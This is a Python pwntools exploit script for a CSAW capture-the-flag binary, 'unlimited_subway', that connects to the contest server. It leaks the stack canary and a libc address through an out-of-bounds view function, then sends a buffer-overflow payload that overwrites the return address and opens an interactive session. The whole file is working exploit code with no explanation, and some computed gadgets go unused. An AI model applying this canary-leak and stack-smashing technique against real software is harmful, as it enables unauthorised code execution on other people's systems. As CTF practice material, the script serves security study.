#!/usr/bin/env python3

from pwn import *

exe = ELF("./unlimited_subway_patched", checksec=False)
libc = ELF("./libc.so.6", checksec=False)

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
    else:
        r = remote('pwn.csaw.io', 7900)
    return r

def view(index):
    r.sendlineafter(b"> ", b"V")
    r.sendlineafter(b"Index : ", f"{index}".encode())

r = conn()
#canary: 28 -> 31
canary = b"0x"
for i in range(131, 127, -1):
    view(i)
    r.recvuntil(b' : ')
    canary += r.recv(2)
canary = int(canary, 16)
log.info("Canary: " + hex(canary))

leak = b"0x"
for i in range(139, 135, -1):
    view(i)
    r.recvuntil(b' : ')
    leak += r.recv(2)
leak = int(leak, 16)

libc.address = leak - 0x254ca
log.info("Libc base: " + hex(libc.address))

ebx = libc.address + 0x0003012f
ecx_edx = libc.address + 0x0003b794
ret = libc.address + 0x0002428b
payload = b"A"* 0x40
payload += p32(canary)
payload += p32(0x0804bf10) #ebp
payload += p32(0x8049304)

r.sendlineafter(b"> ", b"E")
r.sendlineafter(b"Name Size : ", f"{len(payload)}".encode())
r.sendlineafter(b"Name : ", payload)
r.interactive()